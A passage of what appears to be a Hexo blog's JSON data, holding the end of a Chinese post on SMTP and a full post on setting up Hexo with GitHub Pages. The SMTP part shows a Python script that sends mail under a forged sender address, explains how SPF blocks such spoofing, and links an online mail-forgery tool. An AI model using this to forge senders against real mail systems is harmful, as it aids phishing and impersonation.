类似于A.com向B.com发送邮件，直接连接到B.com的服务器然后宣称自己是A.com。这就不需要身份验证了。但如果A.com配置了SPF，那么B.com服务器将校验spf声明的邮件服务器IP与当前发件服务器IP是否一致，如否则拒绝接受！</p>\n</li>\n<li><p>两种模式的命令行试验：<br>  <img src=\"/2017/10/SMTP命令行及Python发送邮件/screenshot01.png\" alt=\"\"></p>\n</li>\n</ul>\n<h2 id=\"SMTP发送邮件-Python3\"><a href=\"#SMTP发送邮件-Python3\" class=\"headerlink\" title=\"SMTP发送邮件 - Python3\"></a>SMTP发送邮件 - Python3</h2><p>参考资料：<a href=\"https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432005226355aadb8d4b2f3f42f6b1d6f2c5bd8d5263000\">廖雪峰-Python教程-SMTP发送邮件</a></p>\n<p>简单的代码实现如下：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> pdb</div><div class=\"line\"><span class=\"keyword\">import</span> logging</div><div class=\"line\"><span class=\"keyword\">from</span> email.mime.text <span class=\"keyword\">import</span> MIMEText</div><div class=\"line\"><span class=\"keyword\">import</span> smtplib</div><div class=\"line\"></div><div class=\"line\">logging.basicConfig(level=logging.INFO)</div><div class=\"line\">msg=MIMEText(<span class=\"string\">'hello,send by python,,,,'</span>,<span class=\"string\">'plain'</span>,<span class=\"string\">'utf-8'</span>)</div><div class=\"line\">logging.info(<span class=\"string\">\"MIME编码\\n%s\"</span>%msg)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#pdb.set_trace()</span></div><div class=\"line\"></div><div class=\"line\">from_addr=<span class=\"string\">\"a@1.com\"</span></div><div class=\"line\">to_addr=<span class=\"string\">\"songgongbin@tass.com.cn\"</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">smtp=smtplib.SMTP(<span class=\"string\">'qiye163mx01.mxmail.netease.com'</span>,<span class=\"number\">25</span>)</div><div class=\"line\"><span class=\"comment\">#smtp.starttls()     # 使用SSL时使用。</span></div><div class=\"line\">smtp.set_debuglevel(<span class=\"number\">1</span>) <span class=\"comment\">#查看交互信息</span></div><div class=\"line\">smtp.sendmail(from_addr,to_addr,msg.as_string())</div><div class=\"line\">smtp.quit</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/10/SMTP命令行及Python发送邮件/screenshot02.png\" alt=\"\"><br>发送肯定是没问题的，但显然命中了网易的反垃圾邮件策略，被拒收了！具体什么是怎样的策略，我不是很清楚了。</p>\n<h2 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h2><p>在线邮件伪造工具：<a href=\"http://tool.chacuo.net/mailanonymous/\">http://tool.chacuo.net/mailanonymous/</a></p>\n<p>Python官方资料：<a href=\"https://docs.python.org/3.6/library/smtplib.html#\">https://docs.python.org/3.6/library/smtplib.html#</a></p>"},{"title":"The begin of blog","_content":"浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。\n这篇就算是一个开端，主要记录下hexo该如何使用。\n\n>     记录一个坑了自己很久的问题：每次hexo d部署之后，自定义域名都恢复到默认的情况，以至于每次部署后都需要在setting中重新配置自定义域名。\n>     【解决办法】：在setting中进行的自定义域名，本质上在根目录下新建一CNAME文件，文件内容为自定义的域名。所以，可以在本地hexo目录的public文件夹下新建一个内容为自定义域名的文件名为“CNAME”的文件。 \n>     2017年06月09日 记\n\n## 搭建hexo静态博客\nHexo官方文档 :: [https://hexo.io/zh-cn/docs](https://hexo.io/zh-cn/docs)\n\n<!-- more -->\n\n### 安装\n\n``` bash\n$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      # 下载Node.js安装包\n$ open node-v6.10.2.pkg      # 傻瓜式安装\n$ brew install git           # 安装git\n$ npm install -g hexo-cli    # 安全hexo\n$ hexo init <folder>         # 从hexo官网下载初始化文件\n$ cd <folder>                \n$ npm install                # 安装站点文件\n\n$ hexo server                # 启动服务器。默认情况下，访问网址为： http://localhost:4000/\n\n$ hexo new [layout] <title>  # 新建一个post\n$ hexo generate              # 生成静态文件\n```\n\n### 使用\n\n``` bash\n$ hexo new [layout] <title>    # layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。\n                               # Hexo 有三种默认布局：post、page 和 draft。\n\n$ hexo new draft <title0>       # 新建一份草稿\n$ hexo publish [layout] <title0>   # 将draft移动到post\n$ hexo generate                 # 生成静态文件\n```\n\n### 部署\n\n``` bash\n$ npm install hexo-deployer-git --save      # 安装hexo-deployer-git以实现git部署\n\n$ vim _config.yml\n--------------[file content]\n    deploy:\n      type: git\n      repo: <repository url>    # 库（Repository）地址\n      branch: [branch]          # 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。\n      message: [message]        # 自定义提交信息 (默认为 Site updated: {{ now('YYYY-MM-DD HH:mm:ss') }})\n--------------[file content]\n$ hexo deploy     # 部署\n```\n\n## Github 配置\n### 新建用于存放pages的repo\n在GitHub上建一个repository（库），任意命名。\n如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。\n如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。\n\n### 新建SSH Keys\n我使用SSH连接GitHub。 [官方文档](https://help.github.com/articles/connecting-to-github-with-ssh/)\n\n``` bash\n$ ls -al ~/.ssh     # 查看是否有 id_rsa 和 id_rsa.pub 文件\n# 如果不存在或者想要生成新的密钥对，可使用下面命令\n$ ssh-keygen -t rsa -b 4096 -C \"user@oddboy.cn\"\n$ pbcopy < ~/.ssh/id_rsa.pub    # 很强势的一个命令，将文件内容直接复制到剪贴板。\n```\n在GitHub的Personal setting --> SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。\n\n如此, hexo depoly就可以用了。\n\n### 新建用于存放hexo博客源码的repo\nhexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。\n\n``` bash\n$ git init    # git本地目录初始化\n$ git remote add origin git@github.com:odboy/hexoBlog-src.git   # 配置远程git库\n$ git add .   \n$ git commit -m \"comment信息\"\n$ git status      # 查看分支情况\n$ git push -u origin master   # 推送到master分支\n```\n\n## 修改主题 -- [spfk](http://luuman.github.io/2015/12/27/Hexo/HexoTheme/)\n\n### 安装\n```\n$ cd ~/Documents/hexoBlog\n$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk\n$ cd themes/spfk\n$ git pull      # 主题update\n$ vim _config.yml\n--------------------\n      # Extensions\n      ## Plugins: https://hexo.io/plugins/\n      ## Themes: https://hexo.io/themes/\n      theme: spfk\n--------------------\n```\n### 插件配置\n\n[图片辅助工具hexo-asset-image](https://github.com/CodeFalling/hexo-asset-image)\n```\nnpm install https://github.com/CodeFalling/hexo-asset-image --save \n```\n\n","source":"_posts/hello-world.md","raw":"---\ntitle: The begin of blog\n---\n浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。\n这篇就算是一个开端，主要记录下hexo该如何使用。\n\n>     记录一个坑了自己很久的问题：每次hexo d部署之后，自定义域名都恢复到默认的情况，以至于每次部署后都需要在setting中重新配置自定义域名。\n>     【解决办法】：在setting中进行的自定义域名，本质上在根目录下新建一CNAME文件，文件内容为自定义的域名。所以，可以在本地hexo目录的public文件夹下新建一个内容为自定义域名的文件名为“CNAME”的文件。 \n>     2017年06月09日 记\n\n## 搭建hexo静态博客\nHexo官方文档 :: [https://hexo.io/zh-cn/docs](https://hexo.io/zh-cn/docs)\n\n<!-- more -->\n\n### 安装\n\n``` bash\n$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      # 下载Node.js安装包\n$ open node-v6.10.2.pkg      # 傻瓜式安装\n$ brew install git           # 安装git\n$ npm install -g hexo-cli    # 安全hexo\n$ hexo init <folder>         # 从hexo官网下载初始化文件\n$ cd <folder>                \n$ npm install                # 安装站点文件\n\n$ hexo server                # 启动服务器。默认情况下，访问网址为： http://localhost:4000/\n\n$ hexo new [layout] <title>  # 新建一个post\n$ hexo generate              # 生成静态文件\n```\n\n### 使用\n\n``` bash\n$ hexo new [layout] <title>    # layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。\n                               # Hexo 有三种默认布局：post、page 和 draft。\n\n$ hexo new draft <title0>       # 新建一份草稿\n$ hexo publish [layout] <title0>   # 将draft移动到post\n$ hexo generate                 # 生成静态文件\n```\n\n### 部署\n\n``` bash\n$ npm install hexo-deployer-git --save      # 安装hexo-deployer-git以实现git部署\n\n$ vim _config.yml\n--------------[file content]\n    deploy:\n      type: git\n      repo: <repository url>    # 库（Repository）地址\n      branch: [branch]          # 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。\n      message: [message]        # 自定义提交信息 (默认为 Site updated: {{ now('YYYY-MM-DD HH:mm:ss') }})\n--------------[file content]\n$ hexo deploy     # 部署\n```\n\n## Github 配置\n### 新建用于存放pages的repo\n在GitHub上建一个repository（库），任意命名。\n如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。\n如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。\n\n### 新建SSH Keys\n我使用SSH连接GitHub。 [官方文档](https://help.github.com/articles/connecting-to-github-with-ssh/)\n\n``` bash\n$ ls -al ~/.ssh     # 查看是否有 id_rsa 和 id_rsa.pub 文件\n# 如果不存在或者想要生成新的密钥对，可使用下面命令\n$ ssh-keygen -t rsa -b 4096 -C \"user@oddboy.cn\"\n$ pbcopy < ~/.ssh/id_rsa.pub    # 很强势的一个命令，将文件内容直接复制到剪贴板。\n```\n在GitHub的Personal setting --> SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。\n\n如此, hexo depoly就可以用了。\n\n### 新建用于存放hexo博客源码的repo\nhexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。\n\n``` bash\n$ git init    # git本地目录初始化\n$ git remote add origin git@github.com:odboy/hexoBlog-src.git   # 配置远程git库\n$ git add .   \n$ git commit -m \"comment信息\"\n$ git status      # 查看分支情况\n$ git push -u origin master   # 推送到master分支\n```\n\n## 修改主题 -- [spfk](http://luuman.github.io/2015/12/27/Hexo/HexoTheme/)\n\n### 安装\n```\n$ cd ~/Documents/hexoBlog\n$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk\n$ cd themes/spfk\n$ git pull      # 主题update\n$ vim _config.yml\n--------------------\n      # Extensions\n      ## Plugins: https://hexo.io/plugins/\n      ## Themes: https://hexo.io/themes/\n      theme: spfk\n--------------------\n```\n### 插件配置\n\n[图片辅助工具hexo-asset-image](https://github.com/CodeFalling/hexo-asset-image)\n```\nnpm install https://github.com/CodeFalling/hexo-asset-image --save \n```\n\n","slug":"hello-world","published":1,"date":"2017-04-06T12:39:17.000Z","updated":"2017-07-03T10:11:24.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfsj000i97uv7ic8g45k","content":"<p>浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。<br>这篇就算是一个开端，主要记录下hexo该如何使用。</p>\n<blockquote>\n<pre><code>记录一个坑了自己很久的问题：每次hexo d部署之后，自定义域名都恢复到默认的情况，以至于每次部署后都需要在setting中重新配置自定义域名。\n【解决办法】：在setting中进行的自定义域名，本质上在根目录下新建一CNAME文件，文件内容为自定义的域名。所以，可以在本地hexo目录的public文件夹下新建一个内容为自定义域名的文件名为“CNAME”的文件。 \n2017年06月09日 记\n</code></pre></blockquote>\n<h2 id=\"搭建hexo静态博客\"><a href=\"#搭建hexo静态博客\" class=\"headerlink\" title=\"搭建hexo静态博客\"></a>搭建hexo静态博客</h2><p>Hexo官方文档 :: <a href=\"https://hexo.io/zh-cn/docs\" target=\"_blank\" rel=\"external\">https://hexo.io/zh-cn/docs</a></p>\n<a id=\"more\"></a>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      <span class=\"comment\"># 下载Node.js安装包</span></div><div class=\"line\">$ open node-v6.10.2.pkg      <span class=\"comment\"># 傻瓜式安装</span></div><div class=\"line\">$ brew install git           <span class=\"comment\"># 安装git</span></div><div class=\"line\">$ npm install -g hexo-cli    <span class=\"comment\"># 安全hexo</span></div><div class=\"line\">$ hexo init &lt;folder&gt;         <span class=\"comment\"># 从hexo官网下载初始化文件</span></div><div class=\"line\">$ <span class=\"built_in\">cd</span> &lt;folder&gt;                </div><div class=\"line\">$ npm install                <span class=\"comment\"># 安装站点文件</span></div><div class=\"line\"></div><div class=\"line\">$ hexo server                <span class=\"comment\"># 启动服务器。默认情况下，访问网址为： http://localhost:4000/</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new [layout] &lt;title&gt;  <span class=\"comment\"># 新建一个post</span></div><div class=\"line\">$ hexo generate              <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo new [layout] &lt;title&gt;    <span class=\"comment\"># layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。</span></div><div class=\"line\">                               <span class=\"comment\"># Hexo 有三种默认布局：post、page 和 draft。</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new draft &lt;title0&gt;       <span class=\"comment\"># 新建一份草稿</span></div><div class=\"line\">$ hexo publish [layout] &lt;title0&gt;   <span class=\"comment\"># 将draft移动到post</span></div><div class=\"line\">$ hexo generate                 <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"部署\"><a href=\"#部署\" class=\"headerlink\" title=\"部署\"></a>部署</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ npm install hexo-deployer-git --save      <span class=\"comment\"># 安装hexo-deployer-git以实现git部署</span></div><div class=\"line\"></div><div class=\"line\">$ vim _config.yml</div><div class=\"line\">--------------[file content]</div><div class=\"line\">    deploy:</div><div class=\"line\">      <span class=\"built_in\">type</span>: git</div><div class=\"line\">      repo: &lt;repository url&gt;    <span class=\"comment\"># 库（Repository）地址</span></div><div class=\"line\">      branch: [branch]          <span class=\"comment\"># 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</span></div><div class=\"line\">      message: [message]        <span class=\"comment\"># 自定义提交信息 (默认为 Site updated: &#123;&#123; now('YYYY-MM-DD HH:mm:ss') &#125;&#125;)</span></div><div class=\"line\">--------------[file content]</div><div class=\"line\">$ hexo deploy     <span class=\"comment\"># 部署</span></div></pre></td></tr></table></figure>\n<h2 id=\"Github-配置\"><a href=\"#Github-配置\" class=\"headerlink\" title=\"Github 配置\"></a>Github 配置</h2><h3 id=\"新建用于存放pages的repo\"><a href=\"#新建用于存放pages的repo\" class=\"headerlink\" title=\"新建用于存放pages的repo\"></a>新建用于存放pages的repo</h3><p>在GitHub上建一个repository（库），任意命名。<br>如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。<br>如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。</p>\n<h3 id=\"新建SSH-Keys\"><a href=\"#新建SSH-Keys\" class=\"headerlink\" title=\"新建SSH Keys\"></a>新建SSH Keys</h3><p>我使用SSH连接GitHub。 <a href=\"https://help.github.com/articles/connecting-to-github-with-ssh/\" target=\"_blank\" rel=\"external\">官方文档</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ls -al ~/.ssh     <span class=\"comment\"># 查看是否有 id_rsa 和 id_rsa.pub 文件</span></div><div class=\"line\"><span class=\"comment\"># 如果不存在或者想要生成新的密钥对，可使用下面命令</span></div><div class=\"line\">$ ssh-keygen -t rsa -b 4096 -C <span class=\"string\">\"user@oddboy.cn\"</span></div><div class=\"line\">$ pbcopy &lt; ~/.ssh/id_rsa.pub    <span class=\"comment\"># 很强势的一个命令，将文件内容直接复制到剪贴板。</span></div></pre></td></tr></table></figure>\n<p>在GitHub的Personal setting –&gt; SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。</p>\n<p>如此, hexo depoly就可以用了。</p>\n<h3 id=\"新建用于存放hexo博客源码的repo\"><a href=\"#新建用于存放hexo博客源码的repo\" class=\"headerlink\" title=\"新建用于存放hexo博客源码的repo\"></a>新建用于存放hexo博客源码的repo</h3><p>hexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git init    <span class=\"comment\"># git本地目录初始化</span></div><div class=\"line\">$ git remote add origin git@github.com:odboy/hexoB<span class=\"built_in\">log</span>-src.git   <span class=\"comment\"># 配置远程git库</span></div><div class=\"line\">$ git add .   </div><div class=\"line\">$ git commit -m <span class=\"string\">\"comment信息\"</span></div><div class=\"line\">$ git status      <span class=\"comment\"># 查看分支情况</span></div><div class=\"line\">$ git push -u origin master   <span class=\"comment\"># 推送到master分支</span></div></pre></td></tr></table></figure>\n<h2 id=\"修改主题-–-spfk\"><a href=\"#修改主题-–-spfk\" class=\"headerlink\" title=\"修改主题 – spfk\"></a>修改主题 – <a href=\"http://luuman.github.io/2015/12/27/Hexo/HexoTheme/\" target=\"_blank\" rel=\"external\">spfk</a></h2><h3 id=\"安装-1\"><a href=\"#安装-1\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ cd ~/Documents/hexoBlog</div><div class=\"line\">$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk</div><div class=\"line\">$ cd themes/spfk</div><div class=\"line\">$ git pull      # 主题update</div><div class=\"line\">$ vim _config.yml</div><div class=\"line\">--------------------</div><div class=\"line\">      # Extensions</div><div class=\"line\">      ## Plugins: https://hexo.io/plugins/</div><div class=\"line\">      ## Themes: https://hexo.io/themes/</div><div class=\"line\">      theme: spfk</div><div class=\"line\">--------------------</div></pre></td></tr></table></figure>\n<h3 id=\"插件配置\"><a href=\"#插件配置\" class=\"headerlink\" title=\"插件配置\"></a>插件配置</h3><p><a href=\"https://github.com/CodeFalling/hexo-asset-image\" target=\"_blank\" rel=\"external\">图片辅助工具hexo-asset-image</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install https://github.com/CodeFalling/hexo-asset-image --save</div></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"<p>浑浑噩噩这么多年，一直没能养成写博客的习惯。如今是时候开始积累自己。<br>这篇就算是一个开端，主要记录下hexo该如何使用。</p>\n<blockquote>\n<pre><code>记录一个坑了自己很久的问题：每次hexo d部署之后，自定义域名都恢复到默认的情况，以至于每次部署后都需要在setting中重新配置自定义域名。\n【解决办法】：在setting中进行的自定义域名，本质上在根目录下新建一CNAME文件，文件内容为自定义的域名。所以，可以在本地hexo目录的public文件夹下新建一个内容为自定义域名的文件名为“CNAME”的文件。 \n2017年06月09日 记\n</code></pre></blockquote>\n<h2 id=\"搭建hexo静态博客\"><a href=\"#搭建hexo静态博客\" class=\"headerlink\" title=\"搭建hexo静态博客\"></a>搭建hexo静态博客</h2><p>Hexo官方文档 :: <a href=\"https://hexo.io/zh-cn/docs\">https://hexo.io/zh-cn/docs</a></p>","more":"<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ wget -C https://nodejs.org/dist/v6.10.2/node-v6.10.2.pkg      <span class=\"comment\"># 下载Node.js安装包</span></div><div class=\"line\">$ open node-v6.10.2.pkg      <span class=\"comment\"># 傻瓜式安装</span></div><div class=\"line\">$ brew install git           <span class=\"comment\"># 安装git</span></div><div class=\"line\">$ npm install -g hexo-cli    <span class=\"comment\"># 安全hexo</span></div><div class=\"line\">$ hexo init &lt;folder&gt;         <span class=\"comment\"># 从hexo官网下载初始化文件</span></div><div class=\"line\">$ <span class=\"built_in\">cd</span> &lt;folder&gt;                </div><div class=\"line\">$ npm install                <span class=\"comment\"># 安装站点文件</span></div><div class=\"line\"></div><div class=\"line\">$ hexo server                <span class=\"comment\"># 启动服务器。默认情况下，访问网址为： http://localhost:4000/</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new [layout] &lt;title&gt;  <span class=\"comment\"># 新建一个post</span></div><div class=\"line\">$ hexo generate              <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ hexo new [layout] &lt;title&gt;    <span class=\"comment\"># layout默认为 post，可以在 _config.yml 的 default_layout 参数指定。</span></div><div class=\"line\">                               <span class=\"comment\"># Hexo 有三种默认布局：post、page 和 draft。</span></div><div class=\"line\"></div><div class=\"line\">$ hexo new draft &lt;title0&gt;       <span class=\"comment\"># 新建一份草稿</span></div><div class=\"line\">$ hexo publish [layout] &lt;title0&gt;   <span class=\"comment\"># 将draft移动到post</span></div><div class=\"line\">$ hexo generate                 <span class=\"comment\"># 生成静态文件</span></div></pre></td></tr></table></figure>\n<h3 id=\"部署\"><a href=\"#部署\" class=\"headerlink\" title=\"部署\"></a>部署</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ npm install hexo-deployer-git --save      <span class=\"comment\"># 安装hexo-deployer-git以实现git部署</span></div><div class=\"line\"></div><div class=\"line\">$ vim _config.yml</div><div class=\"line\">--------------[file content]</div><div class=\"line\">    deploy:</div><div class=\"line\">      <span class=\"built_in\">type</span>: git</div><div class=\"line\">      repo: &lt;repository url&gt;    <span class=\"comment\"># 库（Repository）地址</span></div><div class=\"line\">      branch: [branch]          <span class=\"comment\"># 分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</span></div><div class=\"line\">      message: [message]        <span class=\"comment\"># 自定义提交信息 (默认为 Site updated: &#123;&#123; now('YYYY-MM-DD HH:mm:ss') &#125;&#125;)</span></div><div class=\"line\">--------------[file content]</div><div class=\"line\">$ hexo deploy     <span class=\"comment\"># 部署</span></div></pre></td></tr></table></figure>\n<h2 id=\"Github-配置\"><a href=\"#Github-配置\" class=\"headerlink\" title=\"Github 配置\"></a>Github 配置</h2><h3 id=\"新建用于存放pages的repo\"><a href=\"#新建用于存放pages的repo\" class=\"headerlink\" title=\"新建用于存放pages的repo\"></a>新建用于存放pages的repo</h3><p>在GitHub上建一个repository（库），任意命名。<br>如果是没有个人域名，最好以 [github账号].github.io 命名，后续这个二级域名便指向这个库的GitHub pages。<br>如果有个人域名，可以任意命名，在setting中可以自行设置域名。然后将个人域名DNS解析指向GitHub.io的IP(192.30.252.153,192.30.252.154)。</p>\n<h3 id=\"新建SSH-Keys\"><a href=\"#新建SSH-Keys\" class=\"headerlink\" title=\"新建SSH Keys\"></a>新建SSH Keys</h3><p>我使用SSH连接GitHub。 <a href=\"https://help.github.com/articles/connecting-to-github-with-ssh/\">官方文档</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ls -al ~/.ssh     <span class=\"comment\"># 查看是否有 id_rsa 和 id_rsa.pub 文件</span></div><div class=\"line\"><span class=\"comment\"># 如果不存在或者想要生成新的密钥对，可使用下面命令</span></div><div class=\"line\">$ ssh-keygen -t rsa -b 4096 -C <span class=\"string\">\"user@oddboy.cn\"</span></div><div class=\"line\">$ pbcopy &lt; ~/.ssh/id_rsa.pub    <span class=\"comment\"># 很强势的一个命令，将文件内容直接复制到剪贴板。</span></div></pre></td></tr></table></figure>\n<p>在GitHub的Personal setting –&gt; SSH and GPG keys点击“New SSH key”, 粘贴好公钥即可。</p>\n<p>如此, hexo depoly就可以用了。</p>\n<h3 id=\"新建用于存放hexo博客源码的repo\"><a href=\"#新建用于存放hexo博客源码的repo\" class=\"headerlink\" title=\"新建用于存放hexo博客源码的repo\"></a>新建用于存放hexo博客源码的repo</h3><p>hexo deploy上传的只是生成的静态页面，博客的原始数据仍然存在于本地。为了安全起见，我们需要另外建一个库，用于博客源码。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git init    <span class=\"comment\"># git本地目录初始化</span></div><div class=\"line\">$ git remote add origin git@github.com:odboy/hexoB<span class=\"built_in\">log</span>-src.git   <span class=\"comment\"># 配置远程git库</span></div><div class=\"line\">$ git add .   </div><div class=\"line\">$ git commit -m <span class=\"string\">\"comment信息\"</span></div><div class=\"line\">$ git status      <span class=\"comment\"># 查看分支情况</span></div><div class=\"line\">$ git push -u origin master   <span class=\"comment\"># 推送到master分支</span></div></pre></td></tr></table></figure>\n<h2 id=\"修改主题-–-spfk\"><a href=\"#修改主题-–-spfk\" class=\"headerlink\" title=\"修改主题 – spfk\"></a>修改主题 – <a href=\"http://luuman.github.io/2015/12/27/Hexo/HexoTheme/\">spfk</a></h2><h3 id=\"安装-1\"><a href=\"#安装-1\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ cd ~/Documents/hexoBlog</div><div class=\"line\">$ git clone https://github.com/luuman/hexo-theme-spfk.git themes/spfk</div><div class=\"line\">$ cd themes/spfk</div><div class=\"line\">$ git pull      # 主题update</div><div class=\"line\">$ vim _config.yml</div><div class=\"line\">--------------------</div><div class=\"line\">      # Extensions</div><div class=\"line\">      ## Plugins: 